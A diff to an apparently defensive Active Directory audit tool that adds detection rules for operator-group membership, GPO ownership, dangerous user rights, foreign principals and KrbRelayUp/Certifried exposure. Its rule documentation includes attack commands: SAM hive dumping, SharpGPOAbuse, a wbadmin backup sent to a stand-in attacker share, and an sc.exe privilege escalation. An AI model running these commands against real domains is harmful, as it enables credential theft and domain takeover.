@@ -186,7 +186,7 @@ RULES: Dict[str, Tuple[str, str, int, str]] = {
     "A-NTFRSOnSysvol":        ("SYSVOL still using deprecated NTFRS","Anomaly",5,"LOW"),
     "A-SmartCardPwdRotation": ("Smart-card accounts lack 60-day password rotation","Anomaly",5,"LOW"),
     "A-SmartCardRequired":    ("Privileged accounts lack smart-card enforcement","Anomaly",5,"LOW"),
-    "A-AdminSDHolder":        ("AdminSDHolder ACL inconsistency detected","Anomaly",25,"HIGH"),
+    "A-AdminSDHolder":        ("Non-default write ACEs on AdminSDHolder (persistence backdoor)","Anomaly",40,"HIGH"),
     "A-CertEnrollHttp":       ("ADCS enrollment available over plain HTTP","Anomaly",30,"CRITICAL"),
     "A-CertEnrollChannelBinding":("ADCS enrollment channel binding not configured","Anomaly",25,"HIGH"),
     "A-CertTempAgent":        ("Certificate template: agent enrollment abuse (ESC3)","Anomaly",50,"CRITICAL"),
@@ -249,6 +249,7 @@ RULES: Dict[str, Tuple[str, str, int, str]] = {
     "P-LogonDenied":          ("Admin accounts not restricted by deny-logon GPO","Privileged",10,"MEDIUM"),
     "P-LoginDCEveryone":      ("Everyone allowed interactive logon to DC","Privileged",25,"HIGH"),
     "P-OperatorsEmpty":       ("Built-in operator groups are empty (controls missing)","Privileged",5,"LOW"),
+    "P-OperatorsMember":      ("Built-in operator groups have members","Privileged",25,"HIGH"),
     "P-PrivilegeEveryone":    ("Sensitive privilege assigned to Everyone","Privileged",50,"CRITICAL"),
     "P-UnprotectedOU":        ("OUs without accidental-deletion protection","Privileged",5,"LOW"),
     "P-RecoveryModeUnprotected":("DSRM password not set/protected","Privileged",25,"HIGH"),
@@ -280,6 +281,7 @@ RULES: Dict[str, Tuple[str, str, int, str]] = {
     "S-OS-Vista":             ("Windows Vista/Server 2008 computers in domain","Stale",15,"HIGH"),
     "S-OS-NT":                ("NT4-era OS present in domain","Stale",25,"CRITICAL"),
     "S-OS-W10":               ("End-of-life Windows 10 builds present","Stale",5,"LOW"),
+    "S-OS-2012":              ("Windows Server 2012/2012 R2 (EOL Oct 2023) present","Stale",10,"MEDIUM"),
     "S-SMB-v1":               ("SMBv1 enabled on domain controller","Stale",25,"HIGH"),
     "S-Duplicate":            ("Duplicate (CNF:) accounts detected","Stale",5,"LOW"),
     "S-Domain$$$":            ("Orphaned Domain$$$ accounts present","Stale",5,"LOW"),
@@ -367,6 +369,11 @@ RULES: Dict[str, Tuple[str, str, int, str]] = {
     "S-OrphanedGPO":          ("Orphaned / unlinked GPOs present","Stale",5,"LOW"),
     "A-PasswordInDescription":("Possible credential in an account description/info attribute","Anomaly",50,"HIGH"),
     "P-LAPSReadable":         ("LAPS local-admin password readable by the current principal","Privileged",75,"CRITICAL"),
+    "P-ForeignPriv":          ("Foreign security principal in a privileged group","Privileged",25,"HIGH"),
+    "A-TombstoneLifetime":    ("AD tombstone lifetime is short — deleted objects expire quickly","Anomaly",5,"LOW"),
+    "P-DelegationDCrbcd":     ("RBCD configured on a DC by a non-Tier-0 principal","Privileged",100,"CRITICAL"),
+    "P-GpoNonAdminOwner":     ("GPO owned by a non-admin principal","Privileged",25,"HIGH"),
+    "P-DangerousUserRight":   ("Dangerous user right assigned to a broad principal via GPO","Privileged",50,"CRITICAL"),
 }
 
 # Field/army palette — oxide red, rust, mustard/brass, olive drab, field gray.
@@ -411,8 +418,8 @@ RULE_MATURITY: Dict[str, int] = {
     "A-BadSuccessor":1, "T-SIDHistoryDangerous":1, "T-TGTDelegation":1,
     "P-DelegationEveryone":1, "P-DelegationKeyAdmin":1, "P-DelegationDCt2a4d":1,
     "P-DelegationDCa2d2":1, "P-DangerousExtendedRight":1, "P-ControlPathIndirectEveryone":1,
-    "P-PrivilegeEveryone":1, "P-RBCD-Dangerous":1, "P-ComputerInPrivGroup":1,
-    "S-SIDHistoryPrivileged":1, "P-ExchangePrivEsc":1,
+    "P-PrivilegeEveryone":1, "P-RBCD-Dangerous":1, "P-ComputerInPrivGroup":1, "P-DelegationDCrbcd":1,
+    "S-SIDHistoryPrivileged":1, "P-ExchangePrivEsc":1, "P-ForeignPriv":2,
     # Level 2 — serious
     # A-Krbtgt (stale krbtgt) is golden-ticket persistence, not an initial-access
     # path — level 2 so a routine stale krbtgt no longer forces the "Initial —
@@ -425,18 +432,20 @@ RULE_MATURITY: Dict[str, int] = {
     "A-DsHeuristicsAnonymous":2, "S-NoPreAuth":2, "T-SIDFiltering":2, "A-AdminSDHolder":2,
     "A-DnsZoneUpdate1":2, "A-DnsZoneAUCreateChild":2, "A-DC-Spooler":2, "A-DC-WebClient":2,
     "P-DNSAdmin":2, "S-DesEnabled":2, "P-RBCD":2, "P-ConstrainedDelegService":2,
-    "P-AdminCountOrphan":2, "A-CertROCA":2, "P-Inactive":2,
+    "P-AdminCountOrphan":2, "A-CertROCA":2, "P-Inactive":2, "P-OperatorsMember":2,
+    "P-GpoNonAdminOwner":2, "P-DangerousUserRight":1, "P-LoginDCEveryone":1,
     "A-CertWeakRsaComponent":2, "P-SchemaAdmin":2, "A-RestrictRemoteSAM":2,
     # Level 3 — hardening
     "A-LLMNR":3, "A-NBTNSDisabled":3, "A-HardenedPaths":3, "A-CredentialGuard":3,
     "P-AdminNum":3, "P-AdminPwdTooOld":3, "S-SMB-v1":3, "A-MinPwdLen":3,
     "A-PwdComplexity":3, "P-ProtectedUsers":3, "A-NTLMAudit":3, "A-Guest":3,
-    "S-OS-XP":3, "S-OS-Vista":3, "S-OS-NT":3, "P-LogonDenied":3, "A-DSRMLogon":3,
+    "S-OS-XP":3, "S-OS-Vista":3, "S-OS-2012":3, "S-OS-NT":3, "P-LogonDenied":3, "A-DSRMLogon":3,
     # Level 4 — managed
     "A-AuditDC":4, "A-AuditPowershell":4, "A-PowerShellLogging":4, "P-RecycleBin":4,
     "S-KerberosArmoring":4, "A-PrivilegeAudit":4, "A-PowerShellTranscript":4,
     "A-BackupMetadata":4, "S-FunctionalLevel4":4,
     # Level 5 — optimizing / minor
+    "A-TombstoneLifetime":4,
     "A-NotEnoughDC":5, "S-DC-SubnetMissing":5, "P-UnprotectedOU":5, "S-PrimaryGroup":5,
     "S-C-PrimaryGroup":5, "S-Duplicate":5, "S-Domain$$$":5, "P-OperatorsEmpty":5,
 }
@@ -527,6 +536,14 @@ RULE_MITRE: Dict[str, List[str]] = {
     "P-ControlPathDA": ["T1222.001: ACL Modification", "T1098: Account Manipulation"],
     "P-ControlPathIndirectEveryone": ["T1222.001: ACL Modification"],
     "P-ControlPathIndirectMany": ["T1222.001: ACL Modification"],
+    "P-OperatorsMember": ["T1078: Valid Accounts", "T1098: Account Manipulation"],
+    "P-GpoNonAdminOwner": ["T1484.001: Group Policy Modification", "T1222.001: ACL Modification"],
+    "P-DangerousUserRight": ["T1134: Access Token Manipulation", "T1484.001: Group Policy Modification"],
+    "P-ForeignPriv": ["T1199: Trusted Relationship", "T1078: Valid Accounts"],
+    "P-DelegationDCrbcd": ["T1098: Account Manipulation", "T1134.001: Token Impersonation"],
+    "P-LoginDCEveryone": ["T1078: Valid Accounts", "T1021.001: Remote Desktop Protocol"],
+    "A-TombstoneLifetime": ["T1485: Data Destruction"],
+    "S-OS-2012": ["T1210: Exploitation of Remote Services"],
     "A-Pre2kComputer": ["T1078: Valid Accounts", "T1110: Brute Force"],
     "A-WeakLockout": ["T1110.003: Password Spraying"],
     "P-ExchangePrivEsc": ["T1222.001: ACL Modification", "T1098: Account Manipulation"],
@@ -551,6 +568,16 @@ RULE_SCALE: Dict[str, Tuple[int, int]] = {
     "P-Kerberoasting":   (10, 50),
     "S-Kerberoastable":  (5, 40),
     "P-AdminNum":        (3, 40),
+    "S-NoPreAuth":       (5, 40),
+    "S-DesEnabled":      (5, 30),
+    "A-ReversiblePwd":   (5, 30),
+    "S-Reversible":      (5, 30),
+    "P-AdminPwdTooOld":  (5, 30),
+    "P-OperatorsMember": (5, 35),
+    "S-OS-XP":           (5, 30),
+    "S-OS-Vista":        (3, 20),
+    "S-OS-2012":         (2, 15),
+    "S-OS-NT":           (10, 40),
 }
 
 def scaled_points(rule_id: str, base_points: int, n_affected: int) -> int:
@@ -593,6 +620,14 @@ OP_CATEGORY = {
     "A-PasswordInDescription":"Credential Access","P-LAPSReadable":"Credential Access",
     "P-ControlPathIndirectEveryone":"Privilege Escalation","P-ControlPathIndirectMany":"Privilege Escalation",
     "P-GMSAReadable":"Privilege Escalation",
+    "P-OperatorsMember":"Privilege Escalation",
+    "P-GpoNonAdminOwner":"Privilege Escalation",
+    "P-DangerousUserRight":"Privilege Escalation",
+    "P-LoginDCEveryone":"Privilege Escalation",
+    "P-ForeignPriv":"Lateral Movement",
+    "P-DelegationDCrbcd":"Privilege Escalation",
+    "A-TombstoneLifetime":"Hygiene & Legacy",
+    "S-OS-2012":"Hygiene & Legacy",
     # Credential access / harvesting
     "A-KDSRootKey":"Credential Access","A-AADConnectSync":"Credential Access",
     "A-SeamlessSSO":"Lateral Movement","S-OrphanedGPO":"Hygiene & Legacy",
@@ -1644,6 +1679,74 @@ RULE_DOCS: Dict[str, Dict[str, Any]] = {
         "technical": "groupPolicyContainer objects whose DN appears in no gPLink across the domain root, OUs or sites.",
         "remediation": [
             "Review and delete GPOs that are intentionally unlinked; relink any that should be active.",
+        ],
+    },
+    "P-ForeignPriv": {
+        "description": "A foreign security principal (cross-forest/trust SID) is a member of a privileged group.",
+        "why": "If a trusted domain is compromised, the attacker inherits Tier-0 privileges in THIS domain through the foreign SID's group membership. This is the classic cross-trust lateral-movement path.",
+        "technical": "CN=ForeignSecurityPrincipals container objects with memberOf referencing Domain Admins, Enterprise Admins, etc.",
+        "exploit": [
+            "Compromise the trusted domain, then authenticate as the foreign principal.",
+            "Use the inherited group membership to access resources in this domain.",
+        ],
+        "remediation": [
+            "Review whether the foreign principal still needs Tier-0 membership.",
+            "Replace with a dedicated local account where possible.",
+            "Enable SID filtering (quarantine) on the trust to limit cross-trust SID usage.",
+        ],
+    },
+    "S-OS-2012": {
+        "description": "Windows Server 2012 / 2012 R2 systems remain in the domain — end-of-life since October 2023.",
+        "why": "No further security updates are issued. Known exploits (PrintNightmare, PetitPotam, EternalBlue backports) will never be patched.",
+        "remediation": [
+            "Upgrade to Server 2019 or 2022.",
+            "If migration is delayed, isolate these hosts in a restricted VLAN with monitored access.",
+        ],
+    },
+    "P-DangerousUserRight": {
+        "description": "A dangerous user right (SeDebugPrivilege, SeTcbPrivilege, etc.) is assigned to a broad or non-admin principal via Group Policy.",
+        "why": "User rights like SeDebugPrivilege (inject into any process → SYSTEM), SeBackupPrivilege (read any file → SAM/ntds.dit extraction), and SeImpersonatePrivilege (potato attacks → SYSTEM) grant direct privilege escalation to anyone who receives them. If assigned to Domain Users or Authenticated Users, every domain account becomes a local admin.",
+        "exploit": [
+            "# SeDebugPrivilege → inject into a SYSTEM process",
+            "privilege::debug",
+            "# SeBackupPrivilege → dump SAM/SYSTEM hives",
+            "reg save HKLM\\SAM C:\\temp\\sam.save",
+            "reg save HKLM\\SYSTEM C:\\temp\\system.save",
+        ],
+        "remediation": [
+            "Review GPO Privilege Rights assignments: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → User Rights Assignment.",
+            "Remove broad principals (Everyone, Authenticated Users, Domain Users) from sensitive privilege assignments.",
+            "Restrict dangerous privileges to Administrators only.",
+        ],
+    },
+    "P-GpoNonAdminOwner": {
+        "description": "One or more GPOs are owned by a non-admin principal.",
+        "why": "The owner of an AD object can modify its DACL. A non-admin who owns a GPO can grant themselves write access, change GPO settings (scheduled tasks, logon scripts, software installation), and execute code on every machine the GPO is linked to.",
+        "technical": "groupPolicyContainer objects whose nTSecurityDescriptor OwnerSid is not Domain Admins, Enterprise Admins, SYSTEM, or BUILTIN\\Administrators.",
+        "exploit": [
+            "# Takeover the GPO's DACL as the owner, then modify it:",
+            "SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --GPOName \"Vuln GPO\"",
+        ],
+        "remediation": [
+            "Set GPO ownership to Domain Admins:",
+            "Set-GPPermission -Name '<GPO>' -PermissionLevel GpoEditDeleteModifySecurity -TargetName 'Domain Admins' -TargetType Group",
+            "# Or via dsacls: dsacls \"<GPO-DN>\" /setowner \"DOMAIN\\Domain Admins\"",
+        ],
+    },
+    "P-OperatorsMember": {
+        "description": "Built-in operator groups (Account/Server/Backup/Print Operators) have members.",
+        "why": "These groups grant implicit DC-logon rights, service control, backup/restore (SAM extraction), and registry access. Members are effectively Tier-0 without appearing in Domain Admins. Attackers abuse these for DCSync-equivalent access (Backup Operators) or service-based code execution on DCs (Server Operators).",
+        "technical": "Check BUILTIN\\Account Operators (S-1-5-32-548), Server Operators (549), Backup Operators (551), and Print Operators (550) for any enabled members.",
+        "exploit": [
+            "# Backup Operators → DCSync-equivalent via ntds.dit extraction",
+            "wbadmin start backup -backuptarget:\\\\attacker\\share -include:c: -quiet",
+            "# Server Operators → service modification on DC",
+            "sc.exe \\\\DC config VSS binpath=\"cmd /c net localgroup Administrators attacker /add\"",
+        ],
+        "remediation": [
+            "Remove all members from Account Operators, Server Operators, Backup Operators, and Print Operators.",
+            "Use granular delegation instead of these legacy groups.",
+            "Monitor membership changes with Event IDs 4728/4732.",
         ],
     },
 }
@@ -2795,7 +2898,7 @@ class ADData:
             "(objectClass=trustedDomain)", [
             "name","flatName","securityIdentifier","trustAttributes",
             "trustDirection","trustType","trustPartner",
-            "whenCreated","whenChanged","distinguishedName"])
+            "whenCreated","whenChanged","distinguishedName","pwdLastSet"])
 
     # ── GPOs ──────────────────────────────────────────────────────────────────
 
@@ -2804,7 +2907,7 @@ class ADData:
             "(objectClass=groupPolicyContainer)", [
             "displayName","gPCFileSysPath","flags","versionNumber",
             "gPCFunctionalityVersion","distinguishedName","whenChanged",
-            "cn"])
+            "cn","nTSecurityDescriptor"])
 
     # ── sites / subnets ───────────────────────────────────────────────────────
 
@@ -2903,6 +3006,23 @@ class CheckEngine:
             maturity=rule_maturity(rule_id, sev),
             mitre=RULE_MITRE.get(rule_id, [])))
 
+    def _when_created_age(self, wc) -> Optional[int]:
+        """Days since whenCreated. Returns None if unparseable."""
+        if not wc:
+            return None
+        try:
+            if isinstance(wc, list):
+                wc = wc[0]
+            if isinstance(wc, datetime.datetime):
+                dt = wc if wc.tzinfo else wc.replace(tzinfo=datetime.timezone.utc)
+            elif isinstance(wc, str):
+                dt = datetime.datetime.fromisoformat(wc.replace("Z", "+00:00"))
+            else:
+                return None
+            return days_since(dt)
+        except Exception:
+            return None
+
     def run_all(self):
         self._check_anomaly()
         self._check_privileged()
@@ -2935,6 +3055,16 @@ class CheckEngine:
         self._m_password_in_description()
         self._m_laps_readable()
         self._m_control_paths()
+        self._m_foreign_security_principals()
+        self._m_tombstone_lifetime()
+        self._m_krb_relay_up()
+        self._m_certifried()
+        self._m_priv_object_unprivileged_owner()
+        self._m_trust_password_age()
+        self._m_operator_groups()
+        self._m_gpo_non_admin_owner()
+        self._m_dangerous_user_rights()
+        self._m_dc_logon_everyone()
 
     def _priv_sam_set(self) -> Set[str]:
         """Lowercase sAMAccountNames of every member of a privileged group."""
@@ -3243,6 +3373,290 @@ class CheckEngine:
                       f"{count} distinct non-privileged principals have a control path to "
                       "Tier-0 — a very wide takeover blast radius indicating ACL sprawl.",
                       [f"{count} principals with a path to Domain Admin"])
+
+    # ── Foreign Security Principals in privileged groups (cross-trust lateral) ──
+    def _m_foreign_security_principals(self):
+        fsp_base = f"CN=ForeignSecurityPrincipals,{self.d.base}"
+        try:
+            fsps = self.d.conn.paged_search(
+                fsp_base, "(objectClass=foreignSecurityPrincipal)",
+                ["cn", "distinguishedName", "memberOf", "objectSid", "name"])
+        except Exception:
+            fsps = []
+        priv_lower = {g.lower() for g in self.PRIV_GROUPS_SENSITIVE}
+        affected = []
+        for fsp in fsps:
+            sid = get_str(fsp["attrs"], "cn") or get_str(fsp["attrs"], "name")
+            member_of = get_list(fsp["attrs"], "memberOf")
+            for grp_dn in member_of:
+                grp_name = dn_base(grp_dn)
+                if grp_name.lower() in priv_lower:
+                    affected.append(f"{sid} -> {grp_name}")
+        if affected:
+            self._add("P-ForeignPriv",
+                      f"{len(affected)} foreign security principal(s) (external/cross-forest "
+                      "SIDs) are members of privileged groups. This is a lateral path from a "
+                      "trusted domain into Tier-0 — if the trusted domain is compromised, "
+                      "this domain inherits the compromise.",
+                      affected)
+
+    def _m_tombstone_lifetime(self):
+        try:
+            ds = self.d.conn.search_one(
+                f"CN=Directory Service,CN=Windows NT,CN=Services,{self.d.cfg}",
+                "(objectClass=nTDSService)",
+                ["tombstoneLifetime"])
+        except Exception:
+            ds = None
+        if not ds:
+            return
+        tl = get_int(ds["attrs"], "tombstoneLifetime")
+        if tl > 0 and tl < 180:
+            self._add("A-TombstoneLifetime",
+                      f"AD tombstone lifetime is {tl} days (default 180). A short lifetime "
+                      "means the AD Recycle Bin window is reduced and deleted-object forensics "
+                      "become harder. Attackers who delete evidence have less exposure time.",
+                      [f"tombstoneLifetime={tl}"])
+
+    def _m_krb_relay_up(self):
+        """KrbRelayUp exposure: MAQ>0 + LDAP signing not required = any domain user
+        can get SYSTEM on any domain-joined machine."""
+        if self.d.machine_account_quota <= 0:
+            return
+        conn = getattr(self.d, "conn", None)
+        if getattr(conn, "ldap_signing_not_required", None) is True:
+            self._add("P-MachineAccountQuota",
+                      f"ms-DS-MachineAccountQuota = {self.d.machine_account_quota} AND LDAP "
+                      "signing is not required — KrbRelayUp attack chain is viable: any "
+                      "authenticated user can create a machine account, relay Kerberos auth "
+                      "to LDAP, and set RBCD to get SYSTEM on any domain-joined box. "
+                      "Set MachineAccountQuota to 0 OR enforce LDAP signing.",
+                      [f"MachineAccountQuota={self.d.machine_account_quota} + no LDAP signing"])
+
+    def _m_certifried(self):
+        """CVE-2022-26923 (Certifried): MAQ>0 + machine-enrollable auth template."""
+        if self.d.machine_account_quota <= 0:
+            return
+        published = getattr(self.d, "_published_templates", set())
+        for tmpl in self.d.cert_templates:
+            cn = get_str(tmpl["attrs"], "cn")
+            if published and cn not in published:
+                continue
+            ekus = get_list(tmpl["attrs"], "pKIExtendedKeyUsage")
+            has_auth = bool(set(ekus) & self._AUTH_EKUS)
+            if not has_auth:
+                continue
+            enrollers, parsed = self._template_low_priv_enrollers(tmpl)
+            if parsed and enrollers:
+                dc_sids = {f"{s}-515" for s in self._broad_low_priv_sids()
+                           if s.startswith("S-1-5-21") and s.endswith("-515")}
+                if any("Domain Computers" in e or "Authenticated Users" in e for e in enrollers):
+                    self._add("A-Pre2kComputer",
+                              f"CVE-2022-26923 (Certifried): MachineAccountQuota="
+                              f"{self.d.machine_account_quota} and template '{cn}' is enrollable "
+                              f"by {', '.join(enrollers)} with an authentication EKU. Create a "
+                              "machine account, request a cert with dNSHostName spoofing the DC, "
+                              "and PKINIT as the DC. certipy account create + certipy req.",
+                              [f"MAQ={self.d.machine_account_quota}, template={cn}"])
+                    return
+
+    def _m_priv_object_unprivileged_owner(self):
+        """Privileged objects (DA, EA, SA groups, AdminSDHolder) owned by a non-admin."""
+        if not HAS_IMPACKET_LDAP:
+            return
+        broad = self._broad_low_priv_sids()
+        affected = []
+        for gname in self.PRIV_GROUPS_SENSITIVE:
+            g = self.d.groups.get(gname.lower())
+            if not g:
+                continue
+            try:
+                raw_sd = self.d.conn.fetch_sd(g["dn"])
+                if not raw_sd:
+                    continue
+                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
+                if sd["OwnerSid"]:
+                    owner_sid = sd["OwnerSid"].formatCanonical()
+                    owner_name = broad.get(owner_sid)
+                    if owner_name:
+                        affected.append(f"{gname} owned by {owner_name}")
+            except Exception:
+                continue
+        if affected:
+            self._add("P-OwnsPrivObject",
+                      "Privileged group(s) are owned by a broad/low-privileged principal — "
+                      "the owner can modify the group's DACL and add themselves as a member. "
+                      "Set ownership to Domain Admins.",
+                      affected)
+
+    def _m_trust_password_age(self):
+        """Trust account passwords that haven't been rotated in >1 year."""
+        for trust in self.d.trusts:
+            name = get_str(trust["attrs"], "name") or get_str(trust["attrs"], "trustPartner")
+            pls_raw = get_int(trust["attrs"], "pwdLastSet")
+            if not pls_raw:
+                continue
+            age = days_since(filetime_to_dt(pls_raw))
+            if age is not None and age > 365:
+                self._add("T-Inactive",
+                          f"Trust account for '{name}' has a password {age} days old "
+                          "(>1 year). Trust key rotation should happen automatically; a stale "
+                          "key may indicate a broken trust or a persistence backdoor.",
+                          [f"{name} (trust pwd {age}d old)"])
+
+    def _m_operator_groups(self):
+        """Account/Server/Backup/Print Operators should be empty. Members get
+        dangerous implicit rights (logon to DCs, service control, registry
+        access) that are often overlooked."""
+        op_groups = ["Account Operators", "Server Operators",
+                     "Backup Operators", "Print Operators"]
+        affected = []
+        for gname in op_groups:
+            members = self.d.priv_group_members.get(gname, [])
+            enabled = []
+            for m in members:
+                uac = get_int(m.get("attrs", {}), "userAccountControl") if isinstance(m, dict) else 0
+                if uac_has(uac, UAC_ACCOUNTDISABLE):
+                    continue
+                sam = get_str(m.get("attrs", {}), "sAMAccountName") if isinstance(m, dict) else str(m)
+                if sam:
+                    enabled.append(sam)
+            if enabled:
+                affected.extend(f"{sam} ({gname})" for sam in enabled)
+        if affected:
+            self._add("P-OperatorsMember",
+                      f"{len(affected)} account(s) in built-in operator groups. "
+                      "These groups grant implicit DC logon, service control, and/or "
+                      "backup/restore privileges — they are Tier-0-equivalent and should "
+                      "be empty in a hardened domain.",
+                      affected[:30])
+
+    def _m_gpo_non_admin_owner(self):
+        """GPOs whose owner is not a recognized admin SID (Domain Admins, EA,
+        SYSTEM, Administrators). A non-admin owner can modify the GPO's DACL,
+        change settings, and achieve code execution on linked OUs."""
+        if not HAS_IMPACKET_LDAP:
+            return
+        admin_sids = {"S-1-5-18", "S-1-5-32-544"}  # SYSTEM, BUILTIN\Administrators
+        try:
+            dsid_raw = self.d.domain_obj["attrs"].get("objectSid")
+            if isinstance(dsid_raw, list):
+                dsid_raw = dsid_raw[0] if dsid_raw else None
+            dsid = sid_to_str(dsid_raw) if dsid_raw else None
+            if dsid and dsid.startswith("S-1-5-21"):
+                admin_sids.add(f"{dsid}-512")   # Domain Admins
+                admin_sids.add(f"{dsid}-519")   # Enterprise Admins
+                admin_sids.add(f"{dsid}-500")   # Administrator
+        except Exception:
+            pass
+        affected = []
+        for g in self.d.gpos:
+            raw = g["attrs"].get("nTSecurityDescriptor")
+            if isinstance(raw, list):
+                raw = raw[0] if raw else None
+            if not raw or not isinstance(raw, (bytes, bytearray)):
+                continue
+            try:
+                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
+                if not sd["OwnerSid"]:
+                    continue
+                owner_sid = sd["OwnerSid"].formatCanonical()
+                if owner_sid not in admin_sids:
+                    name = get_str(g["attrs"], "displayName") or get_str(g["attrs"], "cn")
+                    affected.append(f"{name} (owner SID: {owner_sid})")
+            except Exception:
+                continue
+        if affected:
+            self._add("P-GpoNonAdminOwner",
+                      f"{len(affected)} GPO(s) are owned by non-admin principals. "
+                      "The owner can modify the GPO settings and DACL — potential "
+                      "code execution on every machine where the GPO is linked.",
+                      affected[:20])
+
+    _DANGEROUS_RIGHTS = {
+        "setcbprivilege": "SeTcbPrivilege (act as OS)",
+        "sedebugprivilege": "SeDebugPrivilege (debug any process)",
+        "sebackupprivilege": "SeBackupPrivilege (read any file)",
+        "serestoreprivilege": "SeRestorePrivilege (write any file)",
+        "setakeownershipprivilege": "SeTakeOwnershipPrivilege",
+        "seassignprimarytokenprivilege": "SeAssignPrimaryTokenPrivilege",
+        "seimpersonateprivilege": "SeImpersonatePrivilege (potato attacks)",
+        "seloaddriverprivilege": "SeLoadDriverPrivilege (load kernel driver)",
+        "seenabletranslateprivilege": "SeTrustedCredManAccessPrivilege",
+    }
+    _ADMIN_SIDS_RIGHTS = {
+        "S-1-5-18", "S-1-5-19", "S-1-5-20",  # SYSTEM, LOCAL/NETWORK SERVICE
+        "S-1-5-32-544",  # BUILTIN\Administrators
+    }
+
+    def _m_dangerous_user_rights(self):
+        """Detect dangerous privileges assigned to broad/low-priv principals via GPO."""
+        entries = self._get_inf_section("Privilege Rights")
+        if not entries:
+            return
+        broad = self._broad_low_priv_sids()
+        admin_sids = set(self._ADMIN_SIDS_RIGHTS)
+        try:
+            dsid_raw = self.d.domain_obj["attrs"].get("objectSid")
+            if isinstance(dsid_raw, list):
+                dsid_raw = dsid_raw[0] if dsid_raw else None
+            dsid = sid_to_str(dsid_raw) if dsid_raw else None
+            if dsid and dsid.startswith("S-1-5-21"):
+                admin_sids.add(f"{dsid}-512")   # Domain Admins
+                admin_sids.add(f"{dsid}-519")   # Enterprise Admins
+                admin_sids.add(f"{dsid}-500")   # Administrator
+        except Exception:
+            pass
+
+        affected = []
+        for entry in entries:
+            priv_key = entry["key"].strip().lower()
+            priv_name = self._DANGEROUS_RIGHTS.get(priv_key)
+            if not priv_name:
+                continue
+            sids = [s.strip().lstrip("*") for s in str(entry["value"]).split(",")]
+            for sid in sids:
+                if not sid.startswith("S-1-"):
+                    continue
+                if sid in admin_sids:
+                    continue
+                label = broad.get(sid, sid)
+                affected.append(f"{priv_name} → {label}")
+        if affected:
+            self._add("P-DangerousUserRight",
+                      f"{len(affected)} dangerous user right(s) assigned to non-admin "
+                      "principals via GPO. These privileges enable direct local privilege "
+                      "escalation (debug → SYSTEM, backup → SAM extraction, impersonate → "
+                      "potato attacks).",
+                      affected[:20])
+
+    def _m_dc_logon_everyone(self):
+        """Check if Everyone/Authenticated Users/Domain Users can log on to DCs
+        interactively (SeInteractiveLogonRight / SeRemoteInteractiveLogonRight)."""
+        entries = self._get_inf_section("Privilege Rights")
+        if not entries:
+            return
+        broad = self._broad_low_priv_sids()
+        logon_rights = {"seinteractivelogonright", "seremoteinteractivelogonright"}
+        found = []
+        for entry in entries:
+            priv_key = entry["key"].strip().lower()
+            if priv_key not in logon_rights:
+                continue
+            sids = [s.strip().lstrip("*") for s in str(entry["value"]).split(",")]
+            for sid in sids:
+                if not sid.startswith("S-1-"):
+                    continue
+                label = broad.get(sid)
+                if label:
+                    right = "interactive logon" if "interactive" == priv_key.split("remote")[-1][:11] else "remote desktop"
+                    found.append(f"{label} has {right} right (GPO: {entry.get('gpo_name','')})")
+        if found:
+            self._add("P-LoginDCEveryone",
+                      "Broad principal(s) granted interactive or remote logon to domain "
+                      "controllers via GPO. Any domain user can log on locally or via RDP "
+                      "to a DC — trivial escalation vector.",
+                      found[:10])
 
     def _m_sccm(self):
         """SCCM/MECM publishes management points + site servers to AD — a prime
@@ -3803,10 +4217,15 @@ class CheckEngine:
             if not has_exp or has_exp == "0":
                 no_laps.append(get_str(comp["attrs"], "dNSHostName") or
                                get_str(comp["attrs"], "sAMAccountName"))
+        total_eligible = sum(1 for c in self.d.computers
+                             if not uac_has(get_int(c["attrs"], "userAccountControl"), UAC_ACCOUNTDISABLE)
+                             and not uac_has(get_int(c["attrs"], "userAccountControl"), UAC_SERVER_TRUST))
         if len(no_laps) > 0:
+            pct = f" ({len(no_laps)}/{total_eligible} = {100*len(no_laps)//max(total_eligible,1)}%)" if total_eligible else ""
             self._add("A-LAPS-Joined-Computers",
-                      f"{len(no_laps)} enabled workstation/server accounts have no LAPS "
-                      "password set (or LAPS never ran on them).",
+                      f"{len(no_laps)} enabled workstation/server account(s){pct} have no "
+                      "LAPS password set. These machines likely share a static local "
+                      "Administrator password across the estate.",
                       no_laps[:20])
 
     def _a_min_pwd_len(self):
@@ -3835,13 +4254,40 @@ class CheckEngine:
     def _a_lm_hash(self):
         if not self.d.domain_obj:
             return
-        # Old DFL (pre-2003) implies LM-hash storage may still be active; flag it
-        # so the "Do not store LAN Manager hash" GPO can be verified.
-        if self.d.domain_level is not None and 0 <= self.d.domain_level < 2:
+        # Check GPO evidence first — a definitive finding beats the DFL heuristic.
+        # NoLMHash GPO value: 1 = disabled (LM hashes stored), 0 = secure.
+        nolm = self._get_inf_value(
+            "Registry Values",
+            "MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\NoLMHash")
+        if nolm is not None:
+            try:
+                val = int(str(nolm).split(",")[-1].strip())
+            except (ValueError, IndexError):
+                val = None
+            if val == 0:
+                self._add("A-LMHashAuthorized",
+                          "GPO explicitly sets NoLMHash=0 — LM hash storage is active. "
+                          "LM hashes can be brute-forced in minutes on commodity hardware. "
+                          "Set 'Network security: Do not store LAN Manager hash' = Enabled.",
+                          ["NoLMHash=0 (GPO)"])
+                return
+        nolm_reg = self._get_reg_dword("Control\\Lsa", "NoLMHash")
+        if nolm_reg == 0:
             self._add("A-LMHashAuthorized",
-                      "Domain functional level suggests LM hash storage may be active. "
-                      "Verify the 'Network security: Do not store LAN Manager hash' GPO.",
-                      [f"Domain functional level: {FUNCTIONAL_LEVELS.get(self.d.domain_level)}"])
+                      "GPO Registry.pol sets NoLMHash=0 — LM hash storage is active. "
+                      "LM hashes can be brute-forced in minutes. "
+                      "Set 'Network security: Do not store LAN Manager hash' = Enabled.",
+                      ["NoLMHash=0 (Registry.pol)"])
+            return
+        # DFL < 2003 AND no GPO evidence that NoLMHash is set — downgrade to MEDIUM
+        # since it's speculative, not confirmed.
+        if self.d.domain_level is not None and 0 <= self.d.domain_level < 2:
+            if nolm is None and nolm_reg is None:
+                self._add("A-LMHashAuthorized",
+                          "Domain functional level is pre-2003 and no GPO sets NoLMHash=1. "
+                          "LM hash storage MAY be active — verify manually with "
+                          "'Network security: Do not store LAN Manager hash' GPO.",
+                          [f"Domain functional level: {FUNCTIONAL_LEVELS.get(self.d.domain_level)}"])
 
     def _a_protected_users_usage(self):
         pu = self.d.protected_users
@@ -3849,20 +4295,26 @@ class CheckEngine:
         if pu:
